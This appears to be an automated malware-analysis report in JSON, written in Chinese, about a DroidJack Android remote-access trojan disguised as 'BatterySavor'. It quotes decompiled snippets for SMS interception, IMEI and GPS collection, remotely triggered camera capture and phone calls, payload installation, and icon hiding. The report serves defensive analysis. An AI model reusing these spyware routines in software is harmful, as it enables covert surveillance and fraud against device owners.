@@ -1,0 +1,266 @@
+{
+  "APK信息": {
+    "文件名": "46c91f72e63c0857c30c9fea71a3cabf24523b683a5e77348343940072fb7371.apk",
+    "sha256": "46c91f72e63c0857c30c9fea71a3cabf24523b683a5e77348343940072fb7371",
+    "包名": "net.droidjack.server",
+    "应用名": "BatterySavor",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 384.4
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lnet\\droidjack\\server\\bx;",
+          "method_signature": "if(f317a.contains(str)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\nString originatingAddress = smsMessageArr[i].getOriginatingAddress();\nstr = originatingAddress;\nif (f317a.contains(str)) {\n    abortBroadcast();\n}",
+          "malicious_code_snippet_context": "                      String str = null;\n                      int i = 0;\n                      while (i < smsMessageArr.length) {\n>>>                         smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n>>>                         String originatingAddress = smsMessageArr[i].getOriginatingAddress();\n>>>                         sb.append(smsMessageArr[i].getMessageBody());\n>>>                         i++;\n>>>                         str = originatingAddress;\n>>>                     }\n                      if (f317a.contains(str)) {\n                          abortBroadcast();\n                      }",
+          "behavior_description": "代码在短信广播接收器中解析短信PDU并获取发送方地址，若地址在目标列表中，则调用abortBroadcast()中止广播，导致系统短信应用无法收到该短信，实现短信拦截隐藏功能。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "getMacAddress"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lnet\\droidjack\\server\\bf;",
+          "method_signature": "d()",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "return ((TelephonyManager) f293a.getSystemService(\"phone\")).getDeviceId().getBytes();",
+          "malicious_code_snippet_context": "  \n      protected byte[] d() {\n          try {\n>>>             return ((TelephonyManager) f293a.getSystemService(\"phone\")).getDeviceId().getBytes();\n          } catch (Exception e) {\n              ae.a(e);\n              return \"Not Available\".getBytes();",
+          "behavior_description": "通过 Context.getSystemService(\"phone\") 获取 TelephonyManager 实例，调用 getDeviceId() 采集设备 IMEI/MEID 唯一标识符，并转为字节数组返回。该代码位于 DroidJack RAT 的设备指纹采集模块中，IMEI 作为持久唯一标识符用于追踪受感染设备，采集后的数据将汇入 RAT 的数据窃取管道并最终上传至 C2 服务器。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "location_tracking",
+      "中文名": "位置追踪",
+      "MITRE": "T1430",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.ACCESS_FINE_LOCATION"
+        ],
+        "字符串": [
+          "getLastKnownLocation"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lnet\\droidjack\\server\\az;",
+          "method_signature": "call()",
+          "malicious_behavior": "location_tracking",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "LocationManager locationManager = (LocationManager) context.getSystemService(\"location\");\nLocation lastKnownLocation = locationManager.getLastKnownLocation(locationManager.getBestProvider(new Criteria(), false));\nGPSLocation.f244b = Double.valueOf(lastKnownLocation.getLatitude());\nGPSLocation.c = Double.valueOf(lastKnownLocation.getLongitude());\nStringBuilder append = new StringBuilder(String.valueOf(String.valueOf(d))).append(\",\");",
+          "malicious_code_snippet_context": "          Context context;\n          try {\n              context = this.f288a.f;\n>>>             LocationManager locationManager = (LocationManager) context.getSystemService(\"location\");\n>>>             Location lastKnownLocation = locationManager.getLastKnownLocation(locationManager.getBestProvider(new Criteria(), false));\n>>>             GPSLocation.f244b = Double.valueOf(lastKnownLocation.getLatitude());\n>>>             GPSLocation.c = Double.valueOf(lastKnownLocation.getLongitude());\n>>>         } catch (Exception e) {\n              e.printStackTrace();\n              GPSLocation.f244b = Double.valueOf(-1.0d);\n              GPSLocation.c = Double.valueOf(-1.0d);",
+          "behavior_description": "DroidJack RAT通过LocationManager获取设备最后已知GPS位置（经纬度），将坐标存储到静态变量GPSLocation中，并拼接成字符串格式（latitude,longitude），准备上报至C2服务器，实现隐蔽的位置追踪与隐私窃取。数据流向：getLastKnownLocation()获取设备GPS坐标→存储到静态变量并拼接为字符串→准备通过网络外发至攻击者控制的服务器。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lnet\\droidjack\\server\\cb;",
+          "method_signature": "if(read == -1)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "File file = new File(String.valueOf(context2.getFilesDir().getAbsolutePath()) + \"/update.apk\");\nIntent intent = new Intent(\"android.intent.action.VIEW\");\nintent.setDataAndType(Uri.fromFile(file), \"application/vnd.android.package-archive\");\nintent.setFlags(268435456);\ncontext3.startActivity(intent);",
+          "malicious_code_snippet_context": "                      openFileOutput.close();\n                      inputStream.close();\n                      context2 = this.f324a.f323a;\n>>>                     File file = new File(String.valueOf(context2.getFilesDir().getAbsolutePath()) + \"/update.apk\");\n>>>                     file.deleteOnExit();\n>>>                     Intent intent = new Intent(\"android.intent.action.VIEW\");\n>>>                     intent.setDataAndType(Uri.fromFile(file), \"application/vnd.android.package-archive\");\n>>>                     intent.setFlags(268435456);\n                      context3 = this.f324a.f323a;\n                      context3.startActivity(intent);\n                      return \"Ack\".getBytes();",
+          "behavior_description": "代码从输入流读取数据保存为本地 update.apk 文件，随后通过构造 ACTION_VIEW Intent 并指定 MIME 类型为 application/vnd.android.package-archive，调用 startActivity 拉起系统应用安装界面，尝试安装该 APK 文件。在 DroidJack 远控木马中，此行为通常用于下载并诱导安装后续恶意载荷或更新自身。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.CAMERA"
+        ],
+        "字符串": [
+          "takePicture"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lnet\\droidjack\\server\\j;",
+          "method_signature": "if(valueOf.equalsIgnoreCase(\"1\")",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "camera2.startPreview();\ncamSnapDJ5.f239b = true;\ncamera3.takePicture(null, this.f341b, this.f341b);",
+          "malicious_code_snippet_context": "          }\n          camSnapDJ4 = this.f340a.f338a;\n          camera2 = camSnapDJ4.f238a;\n>>>         camera2.startPreview();\n>>>         camSnapDJ5 = this.f340a.f338a;\n>>>         camSnapDJ5.f239b = true;\n          camSnapDJ6 = this.f340a.f338a;\n          camera3 = camSnapDJ6.f238a;\n          camera3.takePicture(null, this.f341b, this.f341b);",
+          "behavior_description": "DroidJack RAT 远程控制木马通过接收远程指令(valueOf.equalsIgnoreCase(\"1\"))触发摄像头，先调用startPreview()启动摄像头预览，随后调用takePicture()秘密拍照，整个过程无用户感知，拍摄的照片可能被回传至攻击者控制的服务器，属于隐私窃取行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lnet\\droidjack\\server\\l;",
+          "method_signature": "if(f.f333a)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String str2 = \"tel:\" + strArr[0];\nIntent intent = new Intent(\"android.intent.action.CALL\");\nintent.setFlags(268435456);\nintent.setData(Uri.parse(str2));\nController.s.startActivity(intent);",
+          "malicious_code_snippet_context": "                      bytes = \"Ack\".getBytes();\n                      break;\n                  case 65:\n>>>                     String str2 = \"tel:\" + strArr[0];\n>>>                     Intent intent = new Intent(\"android.intent.action.CALL\");\n>>>                     intent.setFlags(268435456);\n>>>                     intent.setData(Uri.parse(str2));\n>>>                     Controller.s.startActivity(intent);\n                      bytes = \"Ack\".getBytes();\n                      break;\n                  case 66:",
+          "behavior_description": "DroidJack RAT 远程控制木马的命令处理逻辑。C2服务器下发case 65指令及电话号码参数strArr[0]，代码构造tel:URI并通过ACTION_CALL Intent直接发起电话呼叫，无需用户确认。攻击者可远程控制受害者手机拨打任意号码，可能导致拨打付费号码造成经济损失或用于电信欺诈。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lnet\\droidjack\\server\\bz;",
+          "method_signature": "a()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "this.f320a.getPackageManager().setComponentEnabledSetting(new ComponentName(this.f320a, MainActivity.class), 2, 1);",
+          "malicious_code_snippet_context": "      /* JADX INFO: Access modifiers changed from: protected */\n      public byte[] a() {\n          try {\n>>>             this.f320a.getPackageManager().setComponentEnabledSetting(new ComponentName(this.f320a, (Class<?>) MainActivity.class), 2, 1);\n              return \"Ack\".getBytes();\n          } catch (Exception e) {\n              ae.a(e);",
+          "behavior_description": "代码通过 PackageManager.setComponentEnabledSetting() 将 MainActivity 组件设置为 COMPONENT_ENABLED_STATE_DISABLED(值=2)，使应用图标从启动器中隐藏。该行为来自 DroidJack RAT 远控木马，图标隐藏后用户无法在桌面看到应用图标，增加隐蔽性和卸载难度。数据流向：getPackageManager() → setComponentEnabledSetting(禁用MainActivity)",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "process_kill",
+      "中文名": "进程杀死",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "killProcess"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lnet\\droidjack\\server\\m;",
+          "method_signature": "run()",
+          "malicious_behavior": "process_kill",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "Process.killProcess(Process.myPid());",
+          "malicious_code_snippet_context": "  public class m extends TimerTask {\n      @Override // java.util.TimerTask, java.lang.Runnable\n      public void run() {\n>>>         Process.killProcess(Process.myPid());\n      }\n  }",
+          "behavior_description": "代码在 TimerTask 的 run 方法中，获取当前应用进程的 PID (Process.myPid())，并调用 Process.killProcess() 终止自身进程。在 DroidJack 远控木马中，这通常用于执行自杀指令以逃避查杀或清理痕迹。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
